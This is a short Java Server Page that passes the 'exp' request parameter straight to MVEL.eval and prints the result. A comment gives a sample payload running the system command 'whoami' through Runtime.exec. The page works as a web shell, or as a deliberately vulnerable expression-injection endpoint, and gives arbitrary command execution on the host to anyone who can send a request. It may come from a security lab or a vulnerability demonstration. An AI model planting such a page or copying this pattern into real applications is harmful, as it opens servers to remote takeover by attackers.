<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.mvel2.MVEL" %>
<%
    // java.lang.Runtime.getRuntime().exec('whoami').getInputStream();
    Object obj = MVEL.eval(request.getParameter("exp"));
    out.println(obj);
    out.flush();
    out.close();
%>